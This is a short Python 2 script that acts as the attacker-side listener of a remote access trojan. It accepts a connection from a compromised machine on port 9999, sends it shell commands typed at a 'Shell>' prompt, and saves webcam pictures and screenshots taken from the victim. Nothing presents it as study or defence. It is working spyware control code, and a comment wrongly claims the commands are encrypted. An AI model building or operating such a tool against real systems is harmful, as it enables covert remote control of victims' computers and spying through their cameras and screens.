#!/bin/python

import socket, time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

host = ""
port = 9999

s.bind((host,port))
s.listen(5)

c, addr = s.accept()

print("got connection from",addr)

while True:

	cmd = raw_input("Shell> ")

	#We send the encrypted command to the target
	c.send(cmd.encode())

	data = c.recv(1024).decode()

	if str(data) == "webcamed":

		f = open("camera.png", "wb")
		img = c.recv(1024)
		f.write(img)

		while not ("complete" in str(img)):
			img = c.recv(1024)
			f.write(img)

		f.close()

	#If the screenshot is ready
	if str(data) == "captured":

		#We open a new file that will contain the screenshot picture
		f = open("newscreenshot.png", "wb")
		# We write in the new file the img code
		img = c.recv(1024)
		f.write(img)

		# When the img is totally sent we stop
		while not ("complete" in str(img)):
			img = c.recv(1024)
			f.write(img)

		f.close()

	#We print the received msg (it can be an error)
	print(data)

	if str(cmd) == "q":
		break

c.close()